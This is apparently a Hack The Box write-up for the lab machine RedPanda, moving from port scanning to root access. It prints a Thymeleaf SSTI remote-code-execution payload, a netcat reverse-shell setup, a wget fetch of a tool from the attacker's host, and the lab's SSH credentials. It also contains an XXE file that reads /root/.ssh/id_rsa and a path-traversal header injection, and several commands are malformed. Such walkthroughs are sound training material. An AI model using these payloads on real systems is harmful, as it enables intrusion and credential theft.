### Introduction 
The box is vulnerable to injection attacks, so we can tink first off the SQL injection attack, for a first try analyze the technologies used on the page with wapalyzer, it is always very useful. 


The first thing to do in this box is to add the IP address with its domain into the file /etc/hosts 

### Connection
The IP address of this vulnerable machine is 10.10.11.170 
and the domain is redpanda.htb

`<bash>
#HTB
	10.10.11.170         redpanda.htb
`

Rather than connecting inmediatly we can comprobate the connection sending 1 ping , this is for practical purposes since ping will continue until we stop the process , for ping 1 time run the next command on the terminal after adding the IP address with its respective domain. 

`<bash>
$ping -c1 redpanda.htb
#the -c option is for count
`

### Enumeration 

For a quick scanning of all the ports set the min rate to 5000 running the next command 

`<bash>
$ sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -vvv redpanda.htb -oG allPorts
#-p- option is for all the ports 
#--min-rate is for the quantity of packets send every second
`

Try out to make an script to run this options automatically called nmapfast.sh

Once we obtain information about the open ports  we can scan the ports to obtain more information about the OS or extra details about the services running on these ports 

` <bash> 
$sudo nmap -p22,8080 redpanda.htb -oN targeted
`

Here we obtain important information about how the http page tittle was made , since we can read that 

8080/tcp open http-proxy 
http-tittle {sometitle}  | Made with Spring Boot 

We can use this information for searching exploits 

Another way to obtain this kind of information instead of running another nmap scan is to use the tool whatweb we specify the port 

`<bash>
whatweb http://redpanda.htb:8080/
`


### Browsing the site 

If we already finished to scan the open ports now we can navigate to the site , we firs see a big picture of a red panda and below we can see a navigation bar. 
Nothing comes back when we use our tool Wappalyzer , no technologies are found just a common site. 

But the result is not the common one since we search common words and nohting appear until we just click on the search icon without typing any word. 
Then we start to search for code or see if we can execute javascript from the bar .


In this case now we can see a clue about injection attacks

### Find new paths
So since we only have access to the search bar the first thing that comes to mind is to look out for extra hidden pages in the web page , this can be done with wfuzz or gobuster. 
This is going to help us to gather more information that can be obtained from these hidden pages.

The first alternative is wfuzz and to look out for these paths we would need to use 
`<bash>
$wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirb/dirbuster/directory-list-lowercase-2.3-medium.txt http://redpanda.htb:8080/FUZZ
`

Similarly with gobuster 

`<bash>
$ gobuster dir --url http://{target_IP}/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
`

Whichever is the tool we chosed to use we can get a name about a path that is called /stats

Within this directory we can now find names about the authors of the site  and we are allowed to export the data about their images and results on the site. 


### First memo 

So far so good we have been able to find hidden sites that provided us with information about the authors and stats, we have a clue about what could we do in the site making an injection attack but the most considerable clue that we have is the Spring Bot label about how the site was made. 

We can now search for exploits for this bot


###  Begin the attack 
Research for attacks using STTI vulnerabilities 

### One plausible option 
Attack using Thymeleaf creating a common login module with dependencies .

First evaluate if the page is vulnerable to this kind of injection testing the common results from input , here is a list of the input that can be processed.
Thymeleaf is a modern server side template engine for Java based on XML/HTML/HTML5 syntax. Thymeleaf works and looks just like HTML 

Before attemping the attack, dive deeper into thymeleaf syntax to understand the expressions and extra atributes. 
     -------

- ${...} Variable expressions, OGNL and Spring EL expressions
- \*{...} Selection expressions, used to specific purposes
- \#{... }Message(i18n)expressions-> used for internalization
- @{...}Link{URL} expressions to set correct paths and urls
- ~{...}Fragment expressions - To reuse part of the templates
     -------

Now researching for more information about how to remote execute the code if the Thymeleaf is based in Spring or OGNL but from the enumeration phase we gathered information about the web and we know that it is based on Spring so Thymeleaf is using SpringEL then. 

The line necessary for a remote code execution is the next one 

SpringEL : ${T(java.lang.Runtime).getRuntime().exec('calc')}

Now to see which kind of syntax pass and execute we input every one of the possible syntaxes, until we see that ~ and $ are banned characters so in order to execute the code try out with the other 3 possible options. 

#### Proxy and Burp suite 

Intercept and send communication to the server using Burp Suite and disabling system proxy with fox proxy , these are the tests for injection. 
Send a POST request given by default in burp

Generate commands with a python script that prints the power directory , search for name and then create a python script for obtaining a Reverse Shell

### The actual attack 

Set a listener on your machine on port 443
`<bash>
$nc -lvpn 443
`
Initiate a python server on port 8080 with 
`<python>
$sudo python3 -m http.server 80
`

Execute the script specifying the local IP that is something like 10.10.14.--  the port of the python server and the port of netcat for listening events. 

Once the 200 code is received then it was a successful reverse shell execution 

Upgrade the pseudo terminal with the python3 trick 
`<python>
python3 -c 'import pty; pty.spawn("/bin/bash")'
`

Begin the exploration of the system and obtain the user.txt flag 

Identify which commands can be executed without a password 

Then verify the tasks with procmon. 

Make a quick script that looks out for tasks , this has to be created on /tmp/hsperfdata_woodenk 

`<bash scripting>
\# /bin/bash
old = $(ps -eo command)
while true; do
		new$(ps-eo command)
		diff<(echo "$old")<(echo "$new")| grep "[\>\<]"|grep -v -E "procmon|command"
		old=$new
done
`

Save it as procmon.sh command and change the execute permisions with chmod +x

`<bash>
$chmod +x procmon.sh
`

Execute the script 
From here we can look again to spot vulnerabilities or ways in which we can take advantage of the code in which it was made the site in this case the file of interest is the /opt/credit-score/Logparser/final/target/final-1.0jar-with-dependencies.jar  that is listed as a java -jar file 

Also look out for the MainControler inside the panda_search/.../main/java file 
There we can find the port in which it was deployed 3306, and ==Credentials== 

woodenk : RedPandazRule

Then stablish the connection via ssh with this credentials. 

After succesfully connected via SSH look out for the inet IP address 

Then to find a way to escalate privilege we can use the tool pyspy64
Move to the directory 
/tmp/hsperfdata_woodenk
Transfer pyspy using wget and the http.server 
`<bash>
wget http://10.10.14.--:80/pspy64
`

Change the execution permission again with chmod + for pyspy64

After a while waiting for the script to finish then we can see that we are able to execute

/usr/bin/find /tmp -name *.xml -exec rm -rf {};
but also 
/usr/bin/find  /home/woodenk -name \*.jpg -exec rm -rf{};


Then remember about the java jar file navigate to 

/opt/credit-score/LogParser/final/
and then to 
/src/main/java/com/logparser

Then look carefully for the app.java file and read about the if statements 

there we can see how it has to be the metadata in order to be processed so we would need to create an image and then rewrite the metadata for be processed then go back to the woodenk/home/hspferdata_woodenk

modify the data of the image in your current directory with the tool exiftool 

`<bash>
$exiftool -Artist "../home/woodenk/pwnd" file.jpg
`

Then create a malicious xml archive to obtain the id_rsa key to connect to root via ssh 

Inside this malicious file insert 

`
<!==?xml version="1.0" ?==>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa">]
<credits>
<author>damian</author>
	<image>
		<url> /../../../../../../../home/woodenk/image.jpg</url>
		<hello>&ent;</hello>
		<views>0</views>
	</image>
	<totalviews>0</totalviews>
<credits>
`



Then call for both archives with wget

`
$wget http://10.10.14.--/image.jpg 
`
and for the credits 
`
$wget http://10.10.14.--/pwn_creds.xml
`

One step forward is to then curl the image but with the path we insert in the credits 

`
$curl http://redpanda.htb:8080 -H "User:Agent: ||/../../../../../../../home/woodenk/image.jpg" 
`

then to obfuscate the page navigate to the stats page and export the table from woodenk , after this is done just cat the pwnd_creds.xml 
This would launch the id_rsa 
just copy the id_rsa and create a new id_rsa key to login via root using this key 
change the permissions of the id_rsa file 

`
$chmod 600 id_rsa 
`

then login via ssh 

`
$ssh root@redpanda.htb -i id_rsa
`

look out for the root.txt flag 
